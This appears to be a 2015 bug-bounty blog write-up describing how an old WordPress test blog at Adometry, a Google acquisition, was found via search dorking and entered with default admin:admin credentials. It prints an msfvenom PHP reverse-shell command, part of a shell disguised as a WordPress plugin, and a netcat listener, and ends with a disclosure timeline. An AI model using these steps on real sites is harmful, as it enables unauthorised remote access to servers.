@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Getting a shell on a Google Acquisition &mdash; r0rshark Blog</title>
+    <link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="apple-touch-icon" href="/images/logo.jpg"/>
+    <link href="/feed.xml" rel="alternate" type="application/rss+xml" title="r0rshark Blog" />
+    <meta name="title" content="Getting a shell on a Google Acquisition ">
+    <link rel="canonical" href="https://r0rshark.github.io/2015/07/30/google/">
+    
+    <link rel="author" href="https://plus.google.com/110104859248839601734">
+    <meta property="og:title" content="Getting a shell on a Google Acquisition "/>
+    <meta property="og:url" content="https://r0rshark.github.io/2015/07/30/google/"/>
+    
+    <meta property="og:image" content="https://r0rshark.github.io/images/google/google.jpg"/>
+    
+    <meta property="og:image" content="https://r0rshark.github.io/images/logo.jpg"/>
+    
+    
+    <meta property="og:description" content="Forgotten Wordpress blog could be exploited to get Remote command execution on Adometry by Google "/>
+    <meta name="description" content="Forgotten Wordpress blog could be exploited to get Remote command execution on Adometry by Google "/>
+    
+    <meta property="og:site_name" content="r0rshark Blog">
+</head>
+<body>
+
+<section class="site-nav">
+    <header>
+        <nav id="navigation">
+        <!--  <a class="brand" href="/">
+                <img src="/images/logo.jpg" alt="Inc">
+            </a>-->
+            <a href="/" class="home">Home</a>
+            <a href="https://it.linkedin.com/in/r0rshark">About Me</a>
+
+    </header>
+</section>
+
+
+<div class="article-cover">
+    <div>
+        <img src="/images/google/google.jpg" class="image">
+    </div>
+</div>
+
+<article>
+
+    <div class="container">
+        <header>
+            <div class="meta">
+                By <address><a rel="author" href="" title="Lorenzo Fontana" target="_blank">Lorenzo Fontana</a></address> &mdash;
+                <time pubdate datetime="2015-30-July" title="July 30, 2015">July 30, 2015</time>
+            </div>
+            <h1 class="title">Getting a shell on a Google Acquisition</h1>
+            <h2 class="subtitle"></h2>
+        </header>
+
+        <section>
+            <h3 id="tldr">TL;DR</h3>
+<p>Default Wordpress credentials on an old version of the Adometry blog would have allowed an attacker to upload a PHP shell and execute remote commands.</p>
+
+<h3 id="google-dorking">Google dorking</h3>
+<p>Instead of studying for the exams last month I tryed to discover some bugs in a Google Acquisition to get my name listed on the <strong>Google Hall of Fame</strong>. The acquisition which I have targeted is <strong>Adometry by Google</strong> a SaaS-based marketing attribution and optimization platform. Looking around on their website I have discovered the company blog located at <a href="http://www.adometry.com/blog/">http://www.adometry.com/blog/</a> which runs the <strong>latest version of Wordpress</strong>.
+Since the bugs are often located in hidden and old pages of the website let’s give them a look. A very useful way to discover these pages is Google itself. Using some operands like <code>site:</code> or <code>inurl:</code> and combining these with the <code>interval of dates filter</code> it is possible to discover old pages of a particular website. Let’s try it: <code>site:adometry.com</code> and set the interval of date in the past but not that much. Besides the pages which simply redirect to the main website I have noticed something strange:</p>
+
+<div class="full zoomable">
+  <img src="/images/google/blog2013.png" />
+</div>
+
+<h3 id="the-wordpress-test-blog">The Wordpress test blog</h3>
+<p>The first thing that I have noticed was the title of the blog  <strong>Test | Just another WordPress site - Adometry</strong> which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: <strong>Test</strong> that in many case means vulnerable as hell. The second thing that I have noticed is that the url of this blog <a href="http://www.adometry.com/blog2013/">http://www.adometry.com/blog2013/</a> is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the <strong>Wordpress version was the 3.5.1</strong> that has a lot of vulnerabilities like XSS XXE CSRF and maybe a <a href="https://vagosec.org/2013/12/wordpress-rce-exploit/">RCE</a>, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the <strong>classical credetials</strong> for a testing thing? The default ones and in the case of Wordpress the classical <strong>admin:admin</strong>. Let’s give them a shot and here we are:</p>
+<div class="full zoomable">
+  <img src="/images/google/wordpress.png" />
+</div>
+
+<h3 id="getting-a-shell">Getting a shell</h3>
+<p>The easiest way to get a shell once you have admin access to a Wordpress blog is to <strong>upload a custom plugin</strong> containing a reverse shell, enable it and visit the page which runs it:</p>
+
+<ul>
+  <li>Create a <strong>php reverse shell</strong> using msfvenom and name the file shell.php:</li>
+</ul>
+
+<p><code>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw &gt; shell.php
+</code></p>
+
+<ul>
+  <li>Add comments on the top of the shell.php to <strong>make it a valid plugin</strong> and compress it in zip format</li>
+</ul>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="cm">/*</span>
+<span class="cm">*     Plugin Name: My Shell</span>
+<span class="cm">*     Plugin URI: https://github.com/r0rshark/wordpress-shell</span>
+<span class="cm">*     Description: Execute Commands as the webserver you are serving wordpress with</span>
+<span class="cm">*     Author: r0rshark</span>
+<span class="cm">*     Version: 0.2</span>
+<span class="cm">*     Author URI: https://r0rshark.github.io</span>
+<span class="cm">*                             */</span>
+    <span class="nv">$ipaddr</span><span class="o">=</span><span class="s1">&#39;Your IP&#39;</span><span class="p">;</span>
+    <span class="nv">$port</span><span class="o">=</span><span class="nx">Your</span> <span class="nx">Port</span><span class="p">;</span>
+
+      <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="o">@</span><span class="nb">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+      <span class="nv">$dis</span><span class="o">=@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
+      <span class="o">...</span>
+      <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<ul>
+  <li><strong>Upload and enable the plugin</strong> in the Wordpress dashboard</li>
+</ul>
+<div class="full zoomable">
+  <img src="/images/google/wordpress_plugin.png" />
+</div>
+
+<ul>
+  <li><strong>Setup a listener</strong> at your ip and port used in the msfvenom command:</li>
+</ul>
+
+<p><code>
+nc -lvp port
+</code></p>
+
+<ul>
+  <li><strong>Execute the reverse shell</strong> by visiting www.adometry.com/blog2013/wp-content/plugins/shell/shell.php</li>
+</ul>
+
+<div class="full zoomable">
+  <img src="/images/google/shell.png" />
+</div>
+
+<h3 id="maybe-getting-root">Maybe getting root</h3>
+<p>In the previous picture it is possible to see the current kernel version running on that machine which is the <strong>2.6.32</strong>. I think that there are known <strong>public exploits</strong> to get a root shell exploiting vulnerabilities in this kernel version. For example I have tested  <a href="https://www.exploit-db.com/exploits/15704/">this</a> on a 2.6.31 kernel and since the exploit has been created to work with kernel &lt; 2.6.37 I suppose that it can work as well. Obviously I haven’t tried it because I think this would go beyond of the Bug Bounty scope.</p>
+
+<ul>
+  <li>1 July 2015 Vulnerability reported to the Google Security Team</li>
+  <li>2 July 2015 Vulnerability patched</li>
+  <li>9 July 2015 Got reward of $3133.7</li>
+</ul>
+
+
+            
+<div class="social">
+    
+    <div class="fb-share-button" data-href="https://r0rshark.github.io/2015/07/30/google/" data-layout="button_count"></div>
+    
+    
+    <div>
+        <a href="https://twitter.com/share" class="twitter-share-button">Tweet</a>
+    </div>
+    
+    
+      <script type="text/javascript" src="//www.redditstatic.com/button/button1.js"></script>
+    
+
+
+    
+    <div>
+        <a href="http://news.ycombinator.com/submit" class="hn-share-button">Vote on HN</a>
+    </div>
+    
+</div>
+
+
+        </section>
+
+        <footer>
+            <address>
+               <img src="/images/me.png">
+                <p>Written by <strong><a rel="author" href="https://twitter.com/r0rshark" title="" target="_blank">Lorenzo Fontana</a></strong><br>
+                <span class="muted">Bug hunter and student at Polimi</span>
+                </p>
+            </address>
+
+        </footer>
+
+        
+        <section>
+            <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'r0rshark'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+        </section>
+        
+    </div>
+</article>
+
+
+<footer class="site-footer">
+    <div class="container">
+        &copy; 2015
+
+        <nav>
+            <a href="https://r0rshark.github.io">r0rshark Blog</a> &middot;
+            <a href="https://it.linkedin.com/in/r0rshark">About Me</a>
+        </nav>
+
+        <nav class="social">
+            
+            <a href="https://twitter.com/r0rshark" title="Follow on Twitter" target="_blank"><i class="icon icon-twitter black"></i></a>
+            
+            
+            <a href="/feed.xml" title="RSS Feed">
+                <i class="icon icon-rss black"></i>
+            </a>
+        </nav>
+        <p>Incorporated theme by <a href="https://sendtoinc.com">Inc</a></p>
+    </div>
+</footer>
+
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+<script src="/javascripts/main.js"></script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+
+<script>
+    (function(d, t) {
+        var g = d.createElement(t),
+            s = d.getElementsByTagName(t)[0];
+        g.src = '//hnbutton.appspot.com/static/hn.min.js';
+        s.parentNode.insertBefore(g, s);
+    }(document, 'script'));
+</script>
+
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/it_IT/sdk.js#xfbml=1&version=v2.3&appId=558852617585267";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+</body>
+</html>
